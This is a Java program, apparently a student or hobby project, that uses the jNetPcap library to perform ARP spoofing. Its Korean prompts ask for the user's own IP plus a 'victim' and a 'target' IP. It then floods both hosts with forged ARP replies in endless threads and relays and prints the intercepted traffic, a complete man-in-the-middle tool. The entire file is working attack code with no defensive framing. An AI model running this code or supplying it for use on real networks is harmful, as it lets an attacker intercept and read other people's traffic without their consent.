package com.github.jasgo;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.util.ArrayList;

public class Main {

    public static Pcap pcap = null;
    public static PcapIf device = null;

    public static byte[] myIp = null;
    public static byte[] senderIp = null;
    public static byte[] targetIp = null;

    public static byte[] myMAC = null;
    public static byte[] senderMAC = null;
    public static byte[] targetMAC = null;

    static ArrayList<PcapIf> allDevs = new ArrayList<>();

    public static void main(String[] args) {
        StringBuilder errbuf = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        int r = Pcap.findAllDevs(allDevs, errbuf);
        if (r == Pcap.NOT_OK || allDevs.isEmpty()) {
            System.out.println("네트워크 장치를 찾을 수 없습니다. " + errbuf.toString() + "\n");
            return;
        }
        System.out.println("[ 네트워크 장치 탐색 성공 ]\n원하시는 장치를 선택해주세요.\n");

        int i = 0;
        for (PcapIf device : allDevs) {
            System.out.printf("[ %d ] %s %s\n", i++, device.getName(), (device.getDescription() != null) ? device.getDescription() : "설명없음");
        }
        selectDevice(reader);

        ARP arp = new ARP();
        Ethernet eth = new Ethernet();
        PcapHeader header = new PcapHeader(JMemory.POINTER);
        JBuffer buf = new JBuffer(JMemory.POINTER);
        ByteBuffer buffer = null;
        int id = JRegistry.mapDLTToId(pcap.datalink());

        try {
            myMAC = device.getHardwareAddress();
            System.out.println("자신의 IP를 입력해주세요.\n");
            myIp = InetAddress.getByName(reader.readLine()).getAddress();
            System.out.println("피해자의 아이피를 입력해주세요.\n");
            senderIp = InetAddress.getByName(reader.readLine()).getAddress();
            System.out.println("타겟의 아이피를 입력해주세요.\n");
            targetIp = InetAddress.getByName(reader.readLine()).getAddress();
        } catch (IOException e) {
            System.out.println("IP주소가 잘못되었습니다.\n");
            throw new RuntimeException(e);
        }
        arp = new ARP();
        arp.makeARPRequest(myMAC, myIp, targetIp);
        buffer = ByteBuffer.wrap(arp.getPacket());
        if (pcap.sendPacket(buffer) != Pcap.OK) {
            System.out.println(pcap.getErr());
        }
        System.out.println("타겟에게 ARP Request를 보냈습니다.\n" + bytesToString(arp.getPacket()) + "\n");
        long targetStartTime = System.currentTimeMillis();
        targetMAC = new byte[6];
        while (pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
            if (System.currentTimeMillis() - targetStartTime >= 500) {
                System.out.println("타겟이 응답하지 않습니다.\n");
                return;
            }
            PcapPacket packet = new PcapPacket(header, buf);
            packet.scan(id);
            byte[] sourceIP = new byte[4];
            System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
            if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 && packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 && bytesToString(sourceIP).equals(bytesToString(targetIp)) && packet.hasHeader(eth)) {
                targetMAC = eth.source();
                break;
            } else {
                continue;
            }
        }
        System.out.println("타켓 맥 주소: " + bytesToString(targetMAC) + "\n");

        arp = new ARP();
        arp.makeARPRequest(myMAC, myIp, senderIp);
        buffer = ByteBuffer.wrap(arp.getPacket());
        if (pcap.sendPacket(buffer) != Pcap.OK) {
            System.out.println(pcap.getErr());
        }
        System.out.println("피해자에게 ARP Request를 보냈습니다.\n" + bytesToString(arp.getPacket()) + "\n");
        long senderStartTime = System.currentTimeMillis();
        senderMAC = new byte[6];
        while (pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
            PcapPacket packet = new PcapPacket(header, buf);
            packet.scan(id);
            byte[] sourceIP = new byte[4];
            System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
            if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 && packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 && bytesToString(sourceIP).equals(bytesToString(senderIp)) && packet.hasHeader(eth)) {
                senderMAC = eth.source();
                break;
            } else {
                continue;
            }
        }
        System.out.println("피해자 맥 주소: " + bytesToString(senderMAC) + "\n");
        new SenderARPSpoofing().start();
        new TargetARPSpoofing().start();
        new ARPRelay().start();
    }
    public static String bytesToString(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        int i = 0;
        for (byte b : bytes) {
            sb.append(String.format("%02x ", b & 0xff));
            if(++i % 16 == 0) sb.append("\n");
        }
        return sb.toString();
    }
    public static String asString(final byte[] mac) {
        final StringBuilder buf = new StringBuilder();
        for (byte b : mac) {
            if (buf.length() != 0) {
                buf.append(":");
            }
            if (b >= 0 && b < 16) {
                buf.append("0");
            }
            buf.append(Integer.toHexString((b < 0) ? b+256 : b).toUpperCase());
        }
        return buf.toString();
    }
    public static void selectDevice(BufferedReader reader) {
        try {
            int index = Integer.parseInt(reader.readLine());
            device = allDevs.get(index);
            int snaplen = 1024 * 64;
            int flags = Pcap.MODE_PROMISCUOUS;
            int timeout = 10 * 1000;

            StringBuilder errbuf1 = new StringBuilder();
            pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf1);
            if (pcap == null) {
                System.out.println("네트워크 장치를 열 수 없습니다.\n" + errbuf1.toString() + "\n");
                return;
            }
            System.out.printf("선택한 장치: %s\n", (device.getDescription() != null) ? device.getDescription() : device.getName());
            System.out.println("네트워크 장치를 활성화했습니다.\n");
        } catch (IOException | NumberFormatException e) {
            System.out.printf("0~%d 사이의 정수를 입력해주세요.\n", allDevs.size()-1);
            selectDevice(reader);
        }
    }
    public static class SenderARPSpoofing extends Thread {
        @Override
        public void run() {
            ARP arp = new ARP();
            arp.makeARPReply(senderMAC, myMAC, myMAC, targetIp, senderMAC, senderIp);
            System.out.println("피해자에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
            while (true) {
                ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
                pcap.sendPacket(buffer);
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
    public static class TargetARPSpoofing extends Thread {
        @Override
        public void run() {
            ARP arp = new ARP();
            arp.makeARPReply(targetMAC, myMAC, myMAC, senderIp, targetMAC, targetIp);
            System.out.println("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
            while (true) {
                ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
                pcap.sendPacket(buffer);
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
    public static class ARPRelay extends Thread {
        @Override
        public void run() {
            Ip4 ip = new Ip4();
            PcapHeader header = new PcapHeader(JMemory.POINTER);
            JBuffer buf = new JBuffer(JMemory.POINTER);
            System.out.println("ARP Relay를 진행합니다.\n");
            while (pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
                PcapPacket packet = new PcapPacket(header, buf);
                int id = JRegistry.mapDLTToId(pcap.datalink());
                packet.scan(id);

                byte[] data = packet.getByteArray(0, packet.size());
                byte[] tempDestinationMAC = new byte[6];
                byte[] tempSourceMAC = new byte[6];

                System.arraycopy(data, 0, tempDestinationMAC, 0, 6);
                System.arraycopy(data, 6, tempSourceMAC, 0, 6);

                if (bytesToString(tempDestinationMAC).equals(bytesToString(myMAC)) && bytesToString(tempSourceMAC).equals(bytesToString(myMAC))) {
                    if (packet.hasHeader(ip)) {
                        if (bytesToString(ip.source()).equals(bytesToString(myIp))) {
                            System.arraycopy(targetMAC, 0, data, 0, 6);
                            ByteBuffer buffer = ByteBuffer.wrap(data);
                            pcap.sendPacket(buffer);
                        }
                    }
                } else if (bytesToString(tempDestinationMAC).equals(bytesToString(myMAC)) && bytesToString(tempSourceMAC).equals(bytesToString(senderMAC))) {
                    if (packet.hasHeader(ip)) {
                        System.arraycopy(targetMAC, 0, data, 0, 6);
                        System.arraycopy(myMAC, 0, data, 6, 6);
                        ByteBuffer buffer = ByteBuffer.wrap(data);
                        pcap.sendPacket(buffer);
                    }
                } else if (bytesToString(tempDestinationMAC).equals(bytesToString(myMAC)) && bytesToString(tempSourceMAC).equals(bytesToString(targetMAC))) {
                    if (packet.hasHeader(ip)) {
                        System.arraycopy(senderMAC, 0, data, 0, 6);
                        System.arraycopy(myMAC, 0, data, 6, 6);
                        ByteBuffer buffer = ByteBuffer.wrap(data);
                        pcap.sendPacket(buffer);
                    }
                }
                System.out.println(bytesToString(buf.getByteArray(0, buf.size())));
            }
        }
    }
}
